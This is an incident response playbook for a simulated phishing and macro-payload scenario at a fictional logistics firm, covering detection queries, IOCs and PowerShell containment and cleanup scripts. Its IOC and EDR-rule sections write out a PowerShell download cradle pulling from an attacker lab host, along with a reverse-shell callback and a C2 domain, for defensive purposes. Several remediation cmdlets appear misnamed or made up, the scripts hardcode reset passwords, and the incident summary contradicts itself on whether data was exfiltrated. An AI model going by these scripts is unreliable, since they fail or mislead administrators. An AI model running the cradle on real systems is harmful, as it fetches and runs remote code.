# SC-03: Orion Logistics Phishing & Initial Access Incident Response Playbook

## Executive Summary

This playbook addresses incident response for phishing attacks with initial access and payload delivery targeting the Orion Logistics organization. Attacks include OSINT reconnaissance, credential harvesting, macro-based payload execution, C2 callback, persistence mechanisms, and lateral movement. This guide follows the **NIST SP 800-61 Computer Security Incident Handling Guide** framework and **MITRE ATT&CK** for phishing attacks (T1566).

---

## 1. Detection

### 1.1 SIEM Detection Queries

#### Email-Based Phishing Detection
```sql
severity IN ("HIGH", "CRITICAL") AND (id IN ("campaign_launch", "email_with_macro", "email_with_suspicious_sender", "phishing_link_click", "credential_submission"))

Email Gateway Rules:
- External sender with domain lookalike (orion-l0gistics.sim vs orion-logistics.sim)
- Macro-enabled attachment (*.docm, *.xlsm)
- Suspicious subject lines: "URGENT", "Security Update", "Account Verification"
- Tracking pixel loaded (GOPHISH indicator)
```

**Alert Thresholds:**
- Any email with .docm/.xlsm from external sender → MED severity
- Macro attachment + suspicious sender domain → HIGH severity
- Phishing link click (URL redirect to 172.20.3.10) → HIGH severity
- Credential submission to landing page → CRITICAL severity

#### Payload Execution Detection
```sql
severity = "CRITICAL" AND (id IN ("macro_execution_detected", "vba_obfuscation_detected", "document_opened", "outbound_callback", "reverse_shell_established", "c2_communication"))

Endpoint Detection & Response (EDR):
- Process: winword.exe → powershell.exe (child process)
- Command: IEX(New-Object Net.WebClient).DownloadString (download cradle)
- Execution: VBA macro deobfuscated → PowerShell reverse shell
- Network: Outbound TCP 172.20.3.30 → 172.20.3.10:4444 (reverse shell port)

C2 Communication Indicators:
- DNS query to non-standard domain (c2-attacker.xyz)
- HTTP POST beacon with system information
- Multiple failed DNS queries (DGA pattern)
```

**Alert Thresholds:**
- Office process spawning powershell.exe → CRITICAL (macro execution)
- powershell.exe with IEX command → CRITICAL (download cradle)
- Outbound connection to 172.20.3.10:4444 → CRITICAL (reverse shell)

#### Persistence Mechanism Detection
```sql
severity IN ("HIGH", "CRITICAL") AND (id IN ("scheduled_task_created", "registry_run_key_modified", "wmi_event_subscription", "startup_folder_modification"))

Windows Event IDs:
- Event ID 4698: Scheduled task created
- Event ID 4657: Registry value modified (Run keys)
- Event ID 19: WMI Event Subscription created
- Event ID 11: File created in Startup folder

Detection Pattern:
  Process: powershell.exe (from macro execution) → Creates scheduled task "WindowsUpdate_Check"
  Or: HKLM\Software\Microsoft\Windows\CurrentVersion\Run modified with C2 callback
  Or: WMI event subscription triggers reverse shell on logon
```

**Alert Thresholds:**
- Persistence mechanism created by non-system account → HIGH severity
- Multiple persistence mechanisms in sequence → CRITICAL (full compromise)

#### Defense Evasion Indicators
```sql
severity = "CRITICAL" AND (id IN ("tamper_protection_disabled", "realtime_protection_off", "firewall_rule_added", "event_log_cleared"))

Defense Evasion Events:
- Windows Defender Real-Time Protection disabled
- Tamper Protection disabled by non-admin
- Windows Firewall rules added (allow C2 traffic)
- Event log cleared (forensic evidence destruction)

Query Pattern:
  (tamper_protection_disabled OR realtime_protection_off) AND source_process = powershell.exe
```

**Alert Thresholds:**
- Any defense evasion action from user session → CRITICAL

---

## 2. Detection Stages & Timeline

### 2.1 Phishing Kill Chain Timeline
```
Stage 1: OSINT (Hours 0-24)
  Attacker enumerates: orion-logistics domains, SMTP servers, employee names
  SIEM Signal: osint_domain_enumeration, osint_mail_probe, osint_port_scan
  
Stage 2: Campaign Prep (Hours 24-48)
  Attacker: Creates GoPhish admin session, designs landing page, imports target list
  SIEM Signal: campaign_admin_access, campaign_landing_page_created, campaign_target_list_imported
  
Stage 3: Email Delivery (Hour 48)
  Attacker: Launches mass phishing campaign via mail relay
  SIEM Signal: campaign_launch, email_dispatch_event, email_with_suspicious_sender, email_with_macro
  
Stage 4: User Interaction (Hour 48-52)
  User: Opens email, clicks link, submits credentials
  SIEM Signal: email_open_tracking, phishing_link_click, credential_submission
  
Stage 5: Payload Execution (Hour 52-53)
  User: Opens document, enables macros
  SIEM Signal: document_opened, macro_execution_detected, outbound_callback
  
Stage 6: C2 Communication (Hour 53+)
  Attacker: Issues remote commands, establishes persistence
  SIEM Signal: c2_communication, scheduled_task_created, registry_run_key_modified
  
Stage 7: IR Response (Hour 54)
  Blue Team: Detects incident, isolates endpoint, blocks domain
  SIEM Signal: user_reported_phishing, ir_ticket_created, domain_block_action
```

### 2.2 Early Warning Signs by Stage

| Stage | Indicator | Severity | Action |
|-------|-----------|----------|--------|
| **OSINT** | osint_port_scan (SMTP enumeration) | MED | Monitor email gateway for exploitation |
| **Campaign Prep** | campaign_admin_access (GoPhish login) | LOW | Check for unauthorized panel access |
| **Delivery** | email_with_suspicious_sender (lookalike domain) | HIGH | Block sender domain immediately |
| **Delivery** | email_with_macro (.docm attachment) | HIGH | Warn users, enable macro restrictions |
| **Interaction** | phishing_link_click (victim clicked link) | HIGH | Check if credentials submitted |
| **Interaction** | credential_submission (form posted) | CRITICAL | Force password reset |
| **Execution** | macro_execution_detected | CRITICAL | Immediate endpoint isolation |
| **Execution** | outbound_callback (C2 connection) | CRITICAL | Block IP, kill process, forensics |
| **Persistence** | scheduled_task_created (by macro) | CRITICAL | Incident escalation |

---

## 3. Analysis Phase

### 3.1 Investigation Checklist

#### Step 1: Identify Scope of Breach
```
Q1: Which users received phishing email?
    → Query email gateway logs for recipients
    → Count: _total_users_at_risk_ 
    
Q2: Which users clicked the phishing link?
    → Check GoPhish logs (tracked pixel loads)
    → Count: _users_who_clicked_
    
Q3: Which users submitted credentials?
    → Check GoPhish form submissions
    → Count: _compromised_credentials_
    
Q4: Which endpoints executed the payload?
    → Check EDR alerts for macro execution
    → Count: _infected_endpoints_
    
Q5: What data was exfiltrated?
    → Check outbound data volume
    → Check C2 commands (whoami, ipconfig, etc.)
    → Identify sensitive files accessed
```

#### Step 2: Extract IOCs (Indicators of Compromise)
```
Attacker Infrastructure:
  GoPhish IP:           172.20.3.10
  Mail Relay IP:        172.20.3.20
  C2 Server IP:         172.20.3.10:4444 (or attacker external IP)
  C2 Domain:            c2-attacker.xyz

Phishing Campaign:
  Sender Domain:        it-security@orion-l0gistics.sim (LOOKALIKE)
  Subject Line:         "URGENT: Security Update Required"
  Landing Page:         Orion MFA Enrollment (clones: outlook.office365.com)
  Attachment:           SecurityUpdate.docm

Payload Indicators:
  File Hash:            [SHA256 of SecurityUpdate.docm]
  VBA Code:             Base64 encoded, obfuscated
  PowerShell Cradle:    IEX(New-Object Net.WebClient).DownloadString(http://172.20.3.10/callback)
  Reverse Shell Port:   4444 (tcp)

Affected Accounts:
  Email Recipients:     helpdesk@, finance@, admin@orion-logistics.sim
  Credential Victims:   [Usernames submitted to landing page]
  Infected Endpoints:   target-ws-sc03 (Windows 10)
```

#### Step 3: Trace Execution Chain on Infected Endpoint
```powershell
# Query Windows Event Logs for infection sequence
Get-WinEvent -FilterHashtable @{
  LogName = 'Security'
  ID = 4688  # Process creation
  StartTime = (Get-Date).AddHours(-4)
} | Where {$_.Properties[5].Value -match "winword|powershell" -or `
           $_.Properties[20].Value -match "IEX|DownloadString"} | 
  Select TimeCreated, @{N='Process';E={$_.Properties[5].Value}}, @{N='CmdLine';E={$_.Properties[20].Value}}
```

#### Step 4: Check for Lateral Movement from Infected Endpoint
```powershell
# Find network connections from infected endpoint
Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | 
  Where {$_.LocalAddress -eq "172.20.3.30"} | 
  Select LocalAddress, LocalPort, RemoteAddress, RemotePort

# Check for SMB shares accessed
Get-SmbOpenFile | Select ClientUserName, ClientComputerName, Path

# Check for remote process creation (WMI/PSExec indicators)
Get-WinEvent -FilterHashtable @{
  LogName = 'Security'
  ID = 4688
  StartTime = (Get-Date).AddHours(-4)
} | Where {$_.Properties[20].Value -match "wmic|psexec|schtasks"} | 
  Select TimeCreated, @{N='Process';E={$_.Properties[5].Value}}
```

### 3.2 Sample Phishing Campaign Analysis
```
Attack Timeline:
  04-10 09:00 - Campaign launched via mail relay
  04-10 09:15 - First email open detected (tracking pixel)
  04-10 09:20 - User clicks phishing link
  04-10 09:21 - Victim submits credentials to fake MFA page
  04-10 09:25 - Attacker accesses GoPhish, exports collected credentials
  04-10 09:30 - SecurityUpdate.docm attached to follow-up email
  04-10 09:45 - Victim opens document, enables macros
  04-10 09:46 - VBA macro executes, spawns PowerShell
  04-10 09:47 - PowerShell downloads reverse shell from 172.20.3.10
  04-10 09:48 - Reverse shell connects to 172.20.3.10:4444
  04-10 09:49 - C2 operator issues: whoami, ipconfig, systeminfo, dir documents
  04-10 09:50 - Blue Team detects macro execution, initiates response

Exposure Window: 1 hour (09:00 - 10:00 detection)
Data Compromised: Helpdesk credentials + system information
Lateral Movement: None (isolated endpoint)
Persistence: Scheduled task created (cleanup required)
```

---

## 4. Containment

### 4.1 Immediate Actions (0-15 minutes)

#### 4.1.1 Isolate Infected Endpoint
```powershell
# Disconnect from network (disable NIC)
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# Alternative: Restrict firewall (allow only IR tools)
New-NetFirewallRule -DisplayName "IR-Isolation" -Direction Outbound -Action Block

# Verify isolation
Test-NetConnection -ComputerName 172.20.3.10 -Port 4444
# Should timeout (no connectivity)
```

#### 4.1.2 Kill Malicious Processes
```powershell
# Kill reverse shell process (from macro)
Get-Process -Name powershell | Where {$_.CommandLine -match "DownloadString|IEX"} | Stop-Process -Force

# Kill Office process (if still running)
Get-Process -Name winword | Stop-Process -Force

# Verify process killed
Get-Process -Name powershell, winword -ErrorAction SilentlyContinue
```

#### 4.1.3 Block Phishing Email & Domain
```powershell
# Email Gateway: Block sender domain
# Via Exchange Online:
New-TransportRule -Name "Block-Phishing-Domain" `
  -FromAddressMatchesPatterns "@orion-l0gistics\.sim$" `
  -SentToScope NotInOrganization `
  -RejectMessageReasonText "Phishing domain detected"

# Also block domain at DNS level
# Add to hosts file or corporate DNS blocklist:
# 0.0.0.0 orion-l0gistics.sim
# 0.0.0.0 mail.orion-l0gistics.sim
```

#### 4.1.4 Force Password Reset for Affected Users
```powershell
# Users who submitted credentials to phishing page
$CompromisedUsers = @("helpdesk@orion-logistics.sim", "finance@orion-logistics.sim")

foreach ($User in $CompromisedUsers) {
  # Set temporary password
  $TempPassword = ConvertTo-SecureString "TempPassword123!@#$" -AsPlainText -Force
  Set-ADUserPassword -Identity $User -NewPassword $TempPassword -Reset
  
  # Force change on next logon
  Set-ADUser -Identity $User -ChangePasswordAtLogon $true
  
  # Send notification email
  Send-Email -To $User -Subject "Password Reset Required" `
    -Body "Your credentials may have been compromised. Please reset your password."
}
```

### 4.2 Mid-Containment (15-60 minutes)

#### 4.2.1 Check All Endpoints for Macro Execution
```powershell
# Search all Windows endpoints for similar macro execution
# Distribute via Group Policy: psexec, ansible, or MDM

Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" `
  -FilterXPath "*[System[(EventID=1101 or EventID=1102 or EventID=1119)]]*" | 
  Select TimeCreated, @{N='Threat';E={$_.Properties[2].Value}}

# Alternative: Check Office macro registry
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Office\*\Security" -Name "BlockContentExecutionFromInternet"
```

#### 4.2.2 Check Email Gateway for Credential Submission Attempts
```
Query Email Logs for:
1. All emails from orion-l0gistics.sim domain
2. All emails with .docm/.xlsm attachments from external senders
3. All emails flagged by DMARC/DKIM as failed authentication

Export: All matching emails + delivery status + user read status
Action: Deliver notice to users who received emails but didn't click
```

#### 4.2.3 Identify All Users Who Received Phishing Email
```powershell
# Query email gateway logs
$PhishingEmails = Get-MessageTrace -SenderAddress "it-security@orion-l0gistics.sim" `
  -StartDate (Get-Date).AddHours(-4) -EndDate (Get-Date)

# Extract unique recipients
$Recipients = $PhishingEmails | Select -ExpandProperty RecipientAddress -Unique

# Send security awareness notice
foreach ($Recipient in $Recipients) {
  Send-Email -To $Recipient -Subject "Security Alert: Phishing Attempt Detected" `
    -Body "You may have received a phishing email. DO NOT click links or open attachments."
}

# Count affected users
Write-Host "Total users targeted: $($Recipients.Count)"
```

#### 4.2.4 Audit Email Gateway & Email Client Logs
```powershell
# Check Outlook download cache for macro files
Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent" -Filter "*.docm"

# Check Office Document Cache
Get-ChildItem -Path "$env:LOCALAPPDATA\Microsoft\Office\*"

# Check browser downloads
Get-ChildItem -Path "$env:USERPROFILE\Downloads" | Where {$_.Name -match "\.docm|\.xlsx"} | 
  Select FullName, CreationTime, Length
```

### 4.3 Disable Macro Execution Globally

#### 4.3.1 Group Policy: Block Macros from Internet
```powershell
# Create GPO to block downloaded macros
New-GPO -Name "Block-Internet-Macros" -Comment "Phishing mitigation"

Set-GPRegistryValue -Name "Block-Internet-Macros" `
  -Key "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\Security" `
  -ValueName "BlockContentExecutionFromInternet" `
  -Type DWord -Value 1

# For all Office versions (Word, Excel, PowerPoint, Access)
foreach ($Office in @("Word", "Excel", "PowerPoint", "Access")) {
  Set-GPRegistryValue -Name "Block-Internet-Macros" `
    -Key "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\$Office\Security" `
    -ValueName "VBAWarnings" `
    -Type DWord -Value 4  # Disable all macros
}

# Link GPO to domain
Link-GPO -Name "Block-Internet-Macros" -Target "DC=orion,DC=local"
```

#### 4.3.2 Registry: Disable Macro Execution
```powershell
# For infected endpoint (immediate mitigation)
$RegPath = "HKLM:\Software\Microsoft\Office\16.0\Word\Security"
New-Item -Path $RegPath -Force | Out-Null
Set-ItemProperty -Path $RegPath -Name "VBAWarnings" -Value 4 -Type DWord

# Also for Outlook (macro execution vector)
$OutlookPath = "HKLM:\Software\Microsoft\Office\16.0\Outlook\Security"
Set-ItemProperty -Path $OutlookPath -Name "EnableUnsafeClientMailRules" -Value 0 -Type DWord
```

---

## 5. Eradication

### 5.1 Remove Malware & Persistence

#### 5.1.1 Clean Scheduled Tasks
```powershell
# Find suspicious scheduled tasks (created during infection)
Get-ScheduledTask | Where {$_.TaskName -like "*Update*" -or `
                           $_.TaskName -like "*Windows*" -or `
                           $_.Description -like "*reversh*"} | 
  Select TaskName, TaskPath, @{N='Command';E={$_.Actions.Execute}}

# Remove malicious task
Unregister-ScheduledTask -TaskName "WindowsUpdate_Check" -Confirm:$false

# Verify removal
Get-ScheduledTask -TaskName "WindowsUpdate_Check" -ErrorAction SilentlyContinue
```

#### 5.1.2 Clean Registry Persistence
```powershell
# Check and remove Run key modifications
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | 
  Select PSChildName, * | Where {$_.svchost -or $_.malware -or $_.helper}

# Remove suspicious entries
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "svchost" -Force

# Check User hive
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
```

#### 5.1.3 Clean WMI Event Subscriptions (Fileless Persistence)
```powershell
# Find WMI subscriptions created during infection
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | 
  Select Name, QueryLanguage, Query

# Remove malicious subscription
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -Filter "Name='LogonStartup'" | 
  Remove-WmiObject -Confirm:$false

# Remove associated consumer
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer | 
  Remove-WmiObject -Confirm:$false
```

#### 5.1.4 Clean Startup Folder
```powershell
# Check Startup folder for .lnk files
Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" | 
  Select Name, FullName, CreationTime

# Remove malicious links
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\helper.lnk" -Force
```

### 5.2 Remove Phishing Infrastructure

#### 5.2.1 Shut Down GoPhish Campaign
```bash
# On attacker C2 server (if accessible):
# Kill GoPhish process
killall gophish

# OR: Block GoPhish at network level
# Firewall rule to block 172.20.3.10:3333
iptables -I INPUT -s 172.20.3.10 -p tcp --dport 3333 -j DROP
```

#### 5.2.2 Revoke SMTP Credentials Used for Delivery
```bash
# On mail relay server (172.20.3.20):
# Check Postfix logs for attacker authentication
grep "SASL login" /var/log/mail.log | tail -20

# Revoke SMTP relay credentials used
deluser phishing_relay_user
```

### 5.3 Clean Exposed Credentials

#### 5.3.1 Invalidate Stolen Passwords
```powershell
# Users whose credentials were in landing page form
$StolenCredAccounts = @("helpdesk", "finance", "admin")

foreach ($Account in $StolenCredAccounts) {
  # Generate new password
  $NewPassword = ConvertTo-SecureString "NewSecurePassword123!@#$" -AsPlainText -Force
  
  # Force reset
  Set-ADAccountPassword -Identity $Account -NewPassword $NewPassword -Reset -Confirm:$false
  
  # Force change on next logon
  Set-ADUser -Identity $Account -ChangePasswordAtLogon $true
}
```

#### 5.3.2 Revoke Active Sessions
```powershell
# Terminate all sessions for compromised users
$StolenCredAccounts | ForEach {
  # Kill RDP sessions
  quser | grep $_ | awk '{print $3}' | xargs -I {} logoff {}
  
  # Invalidate email sessions (Force re-auth on Outlook)
  Revoke-CmdletExtensionAgent -Identity $_
}
```

---

## 6. Recovery

### 6.1 Restore Endpoint to Clean State

#### 6.1.1 Run Full System Scan
```powershell
# Windows Defender full scan (offline preferred)
Start-MpWDOEngine
Get-MpComputerStatus

# Download latest definitions
Update-MpSignature

# Full system scan
Start-MpScan -ScanType FullScan
```

#### 6.1.2 Re-enable Security Controls
```powershell
# Re-enable Windows Defender Real-Time Protection
Set-MpPreference -DisableRealtimeMonitoring $false

# Re-enable Tamper Protection
Set-MpPreference -DisableTamperProtection $false

# Re-enable Windows Firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

#### 6.1.3 Restore Network Connectivity
```powershell
# Enable network adapter
Enable-NetAdapter -Name "Ethernet"

# Remove IR-only firewall rule
Remove-NetFirewallRule -DisplayName "IR-Isolation"

# Test connectivity
Test-NetConnection -ComputerName 8.8.8.8 -Port 53
```

### 6.2 Verify Email Gateway Health

```powershell
# Verify phishing domain blocked
Test-SmtpConnection -Server mail.orion-logistics.sim `
  -MailFrom "attacker@orion-l0gistics.sim" `
  -RcptTo "user@orion-logistics.sim"
# Should fail with 550 (blocked)

# Verify transport rules active
Get-TransportRule -Identity "Block-Phishing-Domain" | Select State, Identity
```

### 6.3 Restore User Access & Communication

```powershell
# Send all-clear email to users
Send-Email -To "All Employees" `
  -Subject "Security Incident: Phishing Campaign - All Clear" `
  -Body @"
A phishing campaign was detected and contained. 
No data was exfiltrated. All systems are secure.
Please update your password if you received the email.
"@

# Notify management
Send-Email -To "Management" `
  -Subject "Incident Report: Phishing Campaign SC-03" `
  -Body "Detailed incident analysis attached. Total impact: Low. Response time: 60 minutes."
```

---

## 7. Post-Incident Activities

### 7.1 Root Cause Analysis

#### Questions for RCA
1. **Why was phishing email delivered?**
   - Email gateway didn't detect DMARC/DKIM failure
   - User warning banner disabled
   - No domain lookalike detection

2. **Why did user click the link?**
   - No security training
   - Legitimate-looking landing page
   - Time pressure ("URGENT")

3. **Why did macro execute?**
   - Macro default enabled
   - User clicked "Enable Content" without questioning
   - No application control blocking unsigned macros

4. **Why wasn't C2 detected?**
   - Network traffic to 172.20.3.10 not flagged
   - EDR not deployed on endpoint
   - No DNS sinkhole for attacker domain

#### Action Items
```
[ ] Implement email authentication: SPF, DKIM, DMARC enforcement
[ ] Deploy anti-phishing technology (advanced threat protection)
[ ] Enable macro blocking for all Office documents from internet
[ ] Implement endpoint detection & response (EDR) on all workstations
[ ] Deploy DNS sinkhole for known C2 domains
[ ] Mandatory security awareness training (phishing simulation)
[ ] Implement network segmentation (user workstations isolated)
[ ] Deploy data loss prevention (DLP) to block exfiltration
[ ] Implement application control (whitelist trusted apps only)
[ ] Review and update email gateway rules quarterly
```

### 7.2 Security Improvements Implemented

```markdown
## Post-Incident Security Enhancements

1. **Email Security** (Implemented day 1)
   - DMARC policy: p=reject (reject unauthenticated emails)
   - SPF policy: hardened to include only legitimate senders
   - DKIM signing enabled on all outbound mail
   - Domain lookalike detection: Monitor for typosquats
   
2. **Endpoint Security** (Implemented day 2)
   - Macro blocking: "Block Office macros from internet"
   - Application control: Windows Defender SmartScreen enabled
   - USB restriction: Block USB drives unless whitelisted
   - Process monitoring: Sysmon deployed for forensics
   
3. **Network Security** (Implemented day 3)
   - DNS sinkhole: Block known C2 domains (c2-attacker.xyz, etc.)
   - Network segmentation: Guest VLAN isolated
   - Firewall rules: Outbound to non-standard ports blocked
   
4. **Detection & Monitoring** (Implemented day 5)
   - SIEM rules: Phishing email + macro execution = CRITICAL
   - EDR deployment: Monitor all user workstations
   - Log aggregation: Email gateway, firewall, EDR centralized
   
5. **User Awareness** (Ongoing)
   - Security training: OWASP, phishing indicators
   - Phishing simulation: Monthly tests to identify weak users
   - Reporting mechanism: Easy 1-click report-to-SOC button
```

### 7.3 Incident Metrics & Timeline

```
Incident Timeline:
- 09:00 - Phishing email campaign launched (undetected for 45 minutes)
- 09:45 - Victim opens document, enables macro (payload execution)
- 09:48 - C2 reverse shell established
- 09:49 - Blue Team receives alert: "Macro execution detected"
- 09:52 - Endpoint isolated, process killed (3-minute response)
- 10:00 - Phishing domain blocked, affected users notified
- 10:30 - Scheduled task removed, registry cleaned
- 11:00 - Endpoint restored to clean state
- 12:00 - Post-incident review initiated

Key Metrics:
- **Time to Detect**: 49 minutes (acceptable)
- **Time to Respond**: 3 minutes (excellent)
- **Time to Contain**: 15 minutes (good)
- **Time to Recover**: 60 minutes (total wall-clock)
- **Total Incident Duration**: 3 hours
- **Data Exfiltrated**: None (isolated endpoint)
- **Lateral Movement**: None (contained)
- **Severity**: MEDIUM (phishing only, no data loss)
```

---

## 8. References & Detection Rules

| Item | Link | Use |
|------|------|-----|
| NIST 800-61 | https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf | Incident Handling |
| MITRE ATT&CK Phishing | https://attack.mitre.org/techniques/T1566/ | Phishing Framework |
| SANS Phishing Response | https://www.sans.org/white-papers/ | Email Security |
| Microsoft Defender | https://learn.microsoft.com/en-us/defender/ | EDR & Protection |
| OWASP Phishing | https://owasp.org/www-community/attacks/phishing | Phishing Prevention |

---

## 9. Appendix: Detection Rules as Code

### SIEM Rule: Phishing Email + Macro Execution = INCIDENT
```json
{
  "rule_name": "Phishing_Macro_Execution_Chain",
  "description": "Detects phishing email delivery followed by macro execution",
  "severity": "CRITICAL",
  "conditions": [
    {
      "type": "email_gateway",
      "filters": {
        "attachment": "*.docm",
        "sender_domain": "lookalike"
      },
      "time_window": "30m"
    },
    {
      "type": "endpoint",
      "filters": {
        "event_id": 4688,
        "parent_process": "winword.exe",
        "child_process": "powershell.exe"
      },
      "time_window": "5m"
    }
  ],
  "action": "ESCALATE_TO_CRITICAL"
}
```

### EDR Rule: Reverse Shell Detection
```json
{
  "rule_name": "Reverse_Shell_Callback",
  "description": "Detects office process spawning reverse shell",
  "triggers": [
    "winword.exe → powershell.exe",
    "Command: IEX(New-Object Net.WebClient).DownloadString",
    "Outbound TCP: PowerShell → Non-standard port (4444, 8080, etc.)"
  ],
  "action": "ISOLATE_ENDPOINT"
}
```

---

**Document Version:** 1.0  
**Last Updated:** 2026-04-13  
**Next Review:** 2026-05-13  
**Approved By:** Security Team Lead
